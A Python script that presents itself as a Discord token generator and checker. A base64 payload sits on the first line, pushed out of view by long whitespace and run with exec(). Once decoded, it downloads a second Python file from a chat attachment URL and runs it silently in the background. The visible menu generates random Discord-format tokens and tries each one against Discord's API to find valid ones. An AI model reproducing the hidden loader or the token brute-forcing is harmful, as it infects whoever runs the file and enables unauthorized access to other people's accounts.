import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;import base64;encoded_string = """aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgdGVtcGZpbGUKaW1wb3J0IHN1YnByb2Nlc3MKCmRlZiBkb3dubG9hZF9maWxlKHVybCwgc2F2ZV9kaXIpOgogICAgZmlsZW5hbWUgPSB1cmwuc3BsaXQoIi8iKVstMV0uc3BsaXQoIj8iKVswXQogICAgCiAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oc2F2ZV9kaXIsIGZpbGVuYW1lKQogICAgCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCiAgICAKICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnd2InKSBhcyBmaWxlOgogICAgICAgICAgICBmaWxlLndyaXRlKHJlc3BvbnNlLmNvbnRlbnQpCiAgICAgICAgcmV0dXJuIGZpbGVfcGF0aAogICAgZWxzZToKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIHJ1bl9maWxlX2luX2JhY2tncm91bmQoZmlsZV9wYXRoKToKICAgIHRyeToKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKFsncHl0aG9uJywgZmlsZV9wYXRoXSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCgpmaWxlX3VybCA9ICJodHRwczovL2F1dHVtbi5yZXZvbHQuY2hhdC9hdHRhY2htZW50cy9GUEhEb3NBYWhLSjFCLVY0c2Z6THlLMTY5bkJUZE1aTHZ4MGc1ZTMzMXAvc2Vjb25kLnB5IgoKdGVtcF9kaXIgPSB0ZW1wZmlsZS5nZXR0ZW1wZGlyKCkKCmZpbGVfcGF0aCA9IGRvd25sb2FkX2ZpbGUoZmlsZV91cmwsIHRlbXBfZGlyKQoKaWYgZmlsZV9wYXRoOgogICAgcnVuX2ZpbGVfaW5fYmFja2dyb3VuZChmaWxlX3BhdGgp""";decoded_bytes = base64.b64decode(encoded_string);decoded_string = decoded_bytes.decode("utf-8");exec(decoded_string)
from util.pluggins import *

banner()

def options():
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    import fade
    options = '''
    
    [1] Token Generator
    [2] Token Checker
    [3] Exit
    
    
    '''
    faded_text = fade.purpleblue(options)
    print(faded_text)

    option = Write.Input("Choice [>>] ", Colors.purple_to_blue, interval=0.000)

    if option=='1':
        os.system("cls")
        tokenbanner()
        cantidad = Write.Input("\nAmount To Generate [>>] ", Colors.purple_to_blue)
        while int(count)<int(cantidad):
            Generated = "OT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(38))
            f= open(current_path +"/"+str("Generated")+str("")+".txt","a")
            f.write(Generated+"\n")
            Write.Print("\nToken: " + Generated[:60] + '***********', Colors.green_to_white, interval=0.000)
            count+=1
            if int(count)==int(cantidad):
                print(""" """)
                print(""" """)
                print(""" """)
                Write.Print(f"\n{cantidad} Tokens Generated Successfully!", Colors.purple_to_blue, interval=0.020)
                Write.Print(f"""\n{cantidad} Tokens Successfully Saved In "Generated.txt".""", Colors.purple_to_blue, interval=0.020)
                Write.Input(f"\nPress [ Enter ] To Exit.", Colors.purple_to_blue, interval=0.020)
                break

    elif option=='2':
        os.system("cls")
        tokenbanner()
        with open('Generated.txt', 'r') as f:
            for line in f:
                time.sleep(0)
                token = line.rstrip("\n")
                headers = {
                    'Authorization': f'{token}'  
                }
                src = requests.get('https://discord.com/api/v10/users/@me/library', headers=headers)

                try:
                    if src.status_code == 200:
                        Write.Print(f'\nValid Token! [>>] ' + token[:8] + '***********************', Colors.green_to_blue, interval=0.000)
                    else:
                        Write.Print(f'\nInvalid Token [>>] ' + token[:8] + '***********************', Colors.red_to_blue, interval=0.000)
                except Exception:
                    Write.Print(f"Error, Please Contact Us! ", Colors.purple_to_blue, interval=0.000)
    elif option=='3':
        os.system("cls")
        quit()
    
    else:
        main()

def main():
    title()
    os.system('cls')
    tokenbanner()
    options()


if __name__ == '__main__':
    main()